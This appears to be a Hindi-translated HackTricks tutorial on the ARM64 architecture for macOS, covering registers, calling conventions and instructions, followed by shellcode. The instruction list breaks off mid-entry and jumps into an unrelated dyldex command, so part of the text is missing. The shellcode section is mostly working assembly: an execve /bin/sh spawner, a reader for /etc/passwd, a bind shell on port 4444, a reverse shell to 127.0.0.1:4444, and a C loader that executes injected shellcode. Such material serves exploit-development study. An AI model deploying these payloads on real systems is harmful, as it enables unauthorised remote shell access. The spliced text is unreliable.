# ARM64 का परिचय

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** पर मुझे **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

## **ARM64 का परिचय**

ARM64, जिसे ARMv8-A के नाम से भी जाना जाता है, एक 64-बिट प्रोसेसर आर्किटेक्चर है जिसका उपयोग विभिन्न प्रकार के उपकरणों में किया जाता है जिसमें स्मार्टफोन, टैबलेट, सर्वर, और कुछ हाई-एंड पर्सनल कंप्यूटर (macOS) शामिल हैं। यह ARM Holdings की एक उत्पाद है, जो अपने ऊर्जा-कुशल प्रोसेसर डिजाइनों के लिए जानी जाती है।

### **रजिस्टर्स**

ARM64 में **31 सामान्य-उद्देश्य रजिस्टर्स** होते हैं, जिन्हें `x0` से `x30` तक लेबल किया गया है। प्रत्येक **64-बिट** (8-बाइट) मान संग्रहीत कर सकता है। केवल 32-बिट मानों की आवश्यकता वाले ऑपरेशनों के लिए, वही रजिस्टर्स 32-बिट मोड में w0 से w30 के नामों का उपयोग करके एक्सेस किए जा सकते हैं।

1. **`x0`** से **`x7`** - ये आमतौर पर स्क्रैच रजिस्टर्स के रूप में उपयोग किए जाते हैं और उप-रूटीन्स को पैरामीटर पास करने के लिए।
* **`x0`** एक फंक्शन का रिटर्न डेटा भी ले जाता है
2. **`x8`** - लिनक्स कर्नेल में, `x8` का उपयोग `svc` इंस्ट्रक्शन के लिए सिस्टम कॉल नंबर के रूप में किया जाता है। **macOS में x16 का उपयोग किया जाता है!**
3. **`x9`** से **`x15`** - और अधिक अस्थायी रजिस्टर्स, अक्सर स्थानीय चरों के लिए उपयोग किए जाते हैं।
4. **`x16`** और **`x17`** - अस्थायी रजिस्टर्स, जिनका उपयोग अप्रत्यक्ष फंक्शन कॉल्स और PLT (Procedure Linkage Table) स्टब्स के लिए भी किया जाता है।
* **`x16`** का उपयोग **`svc`** इंस्ट्रक्शन के लिए **सिस्टम कॉल नंबर** के रूप में किया जाता है।
5. **`x18`** - प्लेटफॉर्म रजिस्टर। कुछ प्लेटफॉर्मों पर, इस रजिस्टर का उपयोग प्लेटफॉर्म-विशिष्ट उपयोगों के लिए आरक्षित होता है।
6. **`x19`** से **`x28`** - ये कॉली-सेव्ड रजिस्टर्स हैं। एक फंक्शन को अपने कॉलर के लिए इन रजिस्टर्स के मानों को संरक्षित करना चाहिए।
7. **`x29`** - **फ्रेम पॉइंटर**।
8. **`x30`** - लिंक रजिस्टर। जब `BL` (Branch with Link) या `BLR` (Branch with Link to Register) इंस्ट्रक्शन निष्पादित होता है, तो यह रिटर्न एड्रेस रखता है।
9. **`sp`** - **स्टैक पॉइंटर**, स्टैक के शीर्ष को ट्रैक करने के लिए उपयोग किया जाता है।
10. **`pc`** - **प्रोग्राम काउंटर**, जो अगले निष्पादित होने वाले इंस्ट्रक्शन की ओर इशारा करता है।

### **कॉलिंग कन्वेंशन**

ARM64 कॉलिंग कन्वेंशन निर्दिष्ट करता है कि एक फंक्शन के लिए **पहले आठ पैरामीटर्स** को रजिस्टर्स **`x0` से `x7`** में पास किया जाता है। **अतिरिक्त** पैरामीटर्स को **स्टैक** पर पास किया जाता है। **रिटर्न** मान को रजिस्टर **`x0`** में वापस पास किया जाता है, या **`x1`** में भी **यदि यह 128 बिट्स है**। **`x19`** से **`x30`** और **`sp`** रजिस्टर्स को फंक्शन कॉल्स के पार संरक्षित किया जाना चाहिए।

असेंबली में एक फंक्शन पढ़ते समय, **फंक्शन प्रोलॉग और एपिलॉग** के लिए देखें। **प्रोलॉग** आमतौर पर **फ्रेम पॉइंटर (`x29`) को सेव करने**, **नए फ्रेम पॉइंटर को सेट करने**, और **स्टैक स्पेस को आवंटित करने** में शामिल होता है। **एपिलॉग** आमतौर पर **सेव किए गए फ्रेम पॉइंटर को बहाल करने** और **फंक्शन से लौटने** में शामिल होता है।

### Swift में कॉलिंग कन्वेंशन

Swift का अपना **कॉलिंग कन्वेंशन** होता है जिसे [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) में पाया जा सकता है।

### **सामान्य इंस्ट्रक्शन्स**

ARM64 इंस्ट्रक्शन्स आमतौर पर **`opcode dst, src1, src2` के प्रारूप** में होते हैं, जहां **`opcode`** किया जाने वाला **ऑपरेशन** होता है (जैसे `add`, `sub`, `mov`, आदि), **`dst`** वह **गंतव्य** रजिस्टर होता है जहां परिणाम संग्रहीत किया जाएगा, और **`src1`** और **`src2`** वह **स्रोत** रजिस्टर्स होते हैं। स्रोत रजिस्टर्स के स्थान पर तत्काल मानों का भी उपयोग किया जा सकता है।

* **`mov`**: एक मान को एक **रजिस्टर** से दूसरे में **ले जाएं**।
* उदाहरण: `mov x0, x1` — यह `x1` से `x0` में मान को ले जाता है।
* **`ldr`**: **मेमोरी** से एक मान को **रजिस्टर** में **लोड करें**।
* उदाहरण: `ldr x0, [x1]` — यह `x1` द्वारा इंगित मेमोरी स्थान से `x0` में एक मान लोड करता है।
* **`str`**: **मेमोरी** में एक **रजिस्टर** से एक मान **स्टोर करें**।
* उदाहरण: `str x0, [x1]` — यह `x0` में मान को `x1` द्वारा इंगित मेमोरी स्थान में स्टोर करता है।
* **`ldp`**: **रजिस्टर्स की जोड़ी लोड करें**। यह इंस्ट्रक्शन **लगातार मेमोरी** स्थानों से **दो रजिस्टर्स लोड करता है**। मेमोरी पता आमतौर पर एक अन्य रजिस्टर में मान में एक ऑफसेट जोड़कर बनाया जाता है।
* उदाहरण: `ldp x0, x1, [x2]` — यह `x0` और `x1` को `x2` और `x2 + 8` के मेमोरी स्थानों से लोड करता है।
* **`stp`**: **रजिस्टर्स की जोड़ी स्टोर
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
कभी-कभी **`libsystem_kernel.dylib`** से **डीकंपाइल** किया गया कोड **सोर्स कोड** की जांच करने से ज्यादा आसान होता है क्योंकि कई सिस्कॉल्स (BSD और Mach) के कोड स्क्रिप्ट्स के माध्यम से जनरेट किए जाते हैं (सोर्स कोड में टिप्पणियों की जांच करें) जबकि dylib में आप यह पता लगा सकते हैं कि क्या कॉल किया जा रहा है।
{% endhint %}

### Shellcodes

संकलित करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>C कोड शेलकोड का परीक्षण करने के लिए</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**यहाँ**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) से लिया गया और समझाया गया।

{% tabs %}
{% tab title="adr के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="स्टैक के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### cat के साथ पढ़ें

लक्ष्य `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना है, इसलिए दूसरा तर्क (x1) पैरामीटर्स का एक सरणी है (जो मेमोरी में इसका मतलब पतों का एक ढेर है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### एक fork का उपयोग करके sh के साथ command इन्वोक करें ताकि मुख्य प्रक्रिया को न मारा जाए
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### बाइंड शेल

[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) से बाइंड शेल **पोर्ट 4444** में
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### रिवर्स शेल

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) से, **127.0.0.1:4444** पर रिवर्स शेल
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
